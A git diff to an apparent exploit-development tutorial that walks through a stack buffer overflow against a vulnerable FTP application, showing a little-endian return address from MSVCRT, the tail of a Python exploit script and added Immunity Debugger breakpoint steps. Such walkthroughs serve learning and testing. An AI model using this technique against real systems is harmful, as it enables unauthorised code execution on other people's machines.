@@ -334,9 +334,9 @@ If you cannot find the exe of the vulnerable application then you should look fo
 
 You can also take a look at jmp.txt for the remainder of the vulnerable applications 
 
-MSVRCT.ddl return address is: \x59\x54\xc3\x77 ( because of little indian we want to reverse it that is why it is reversed )
+MSVRCT.ddl return address is: "\x59\x54\xc3\x77" ( because of little indian we want to reverse it that is why it is reversed )
 
-so we updated our exploit to look like this:
+So we updated our exploit to look like this:
 
 ```python3
 #!/usr/bin/python3
@@ -369,4 +369,23 @@ print(response)
 s.send(b"PASS parrot\r\n")
 s.close()
 ```
+
+#### Now we will need to start working on code execution 
+
+first things first lets set our break point in immunity 
+
+
+``
+bp 0x77c35459
+``
+
+If we resend the exploit we should see that the break point was made at the bottom of immunity debugger: 
+
+<img src="/images/immunity-bp.png">
+
+We can slowly proceed with F7 on your keyboard to see the following: 
+
+<img src="/images/immunity-f71.png">
+
+<img src="/images/immunity-f72.png">
 
